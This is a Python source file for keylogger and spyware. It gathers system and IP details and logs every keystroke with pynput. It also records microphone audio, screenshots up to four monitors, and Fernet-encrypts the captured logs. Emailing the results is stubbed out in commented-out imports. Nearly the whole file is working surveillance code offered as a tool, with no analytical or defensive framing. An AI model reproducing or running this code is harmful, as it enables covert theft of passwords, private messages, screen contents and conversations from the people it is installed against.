from pynput.keyboard import Key, Listener
# from email.mime.multipart import MIMEMultipart
# from email.mime.base import MIMEBase
# from email import encoders
# import smtplib
from scipy.io.wavfile import write
import sounddevice as sd
import socket
import platform
import requests
from mss import mss
from cryptography.fernet import Fernet
#from cryptography.hazmat.backends import default_backend
# from cryptography.hazmat.primitives import hashes
# from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
# import base64
from datetime import datetime
import time


# set_password = "wasd"

# Files
system_info = "system.txt"
audio_info = "audio.wav"
keys_info = "key_log.txt"

system_info_e = "e_system.txt"
keys_info_e = "e_key_log.txt"


# Get info
def get_info():
    hostname = socket.gethostname()
    internal_ip = socket.gethostbyname(hostname)
    processor = platform.processor()
    sys_version = platform.system()
    version_info = platform.version()
    machine_info = platform.machine()

    try:
        ext_ip = requests.get("https://api.ipify.org").text

        with open(system_info, "a") as f:
            f.write(
                """Hostname: %s\nIPv4: %s\nExternal IP: %s\nProcessor: %s\nSystem Version: %s\nVersion Information: %s\nMachine Information: %s"""
                % ( hostname,
                internal_ip,
                ext_ip,
                processor,
                sys_version,
                version_info,
                machine_info)
            )
    except AttributeError:
        return 0


# Keylogging
def on_press(key):
    try:
        with open(keys_info, "a") as f:
            if (key == "Key.space"):
                key == " "
            elif (key == "Key.enter"):
                key = "\n" 
            f.write(str(key))
    except AttributeError:
        return 0


def on_release(key):
    try:
        if key == Key.esc:
            return 0
    except AttributeError:
        return 0


# Record audio
def rec():
    duration = 10
    fs = 44100
    sd.default.samplerate = fs
    sd.default.channels = 2

    try:
        recording = sd.rec(int(duration * fs))
        sd.wait()
        write(audio_info, fs, recording)
    except:
        return 0


# Take screenshots of n number of monitors
def screenshot():
    now = datetime.now().strftime("%d%m%Y_%H%M%S")
    monitors = 4

    try:
        for i in range(1, monitors+1):
            mss().shot(mon=i, output="{}_{}.png".format(now, i))
            time.sleep(2)
    except:
        return 0


# Encryption
def generate_key():
    key = Fernet.generate_key()
    file = open('key.key', 'wb')
    file.write(key)
    file.close()
    

def encrypt_file(filename, e_filename):
    file = open('key.key', "rb")
    key = file.read()
    file.close()

    with open(filename, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(e_filename, "wb") as f:
        f.write(encrypted)

def decrypt_file(e_filename, d_filename):
    file = open('key.key', "rb")
    key = file.read()
    file.close()

    with open(e_filename, "rb") as f:
        e_data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(e_data)

    with open(d_filename, "wb") as f:
        f.write(decrypted)


# def read_key():
#     file = open('key.key', 'rb')
#     key = file.read()
#     file.close()

# def create_password():
#     password = set_password.encode()
#     salt = b'\xc24\x1aqR\x9c \xd6\xf1\xfaX\x84\x8bZ!\x02'
#     kfd = PBKDF2HMAC(
#         algorithm=hashes.SHA256(),
#         length=32,
#         salt=salt,
#         iterations=100000,
#         backend=default_backend()
#     )
#     key = base64.urlsafe_b64encode(kdf.derive(password))


def main():
    get_info()
    generate_key()

    current_time = time.time()
    wait_time = 5
    end_time = current_time + wait_time

    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    while int(current_time) <= int(end_time):
        if time.time() >= end_time:
            screenshot()
            rec()
            listener.stop()
        current_time = time.time()
    
    try:
        encrypt_file(system_info, system_info_e)
        encrypt_file(keys_info, keys_info_e)
        
        # Decryption
        #decrypt_file(system_info_e, "d_sys_info.txt")
        #decrypt_file(keys_info_e, "d_keys_info.txt")
    except:
        return 0

if __name__ == "__main__":
    main()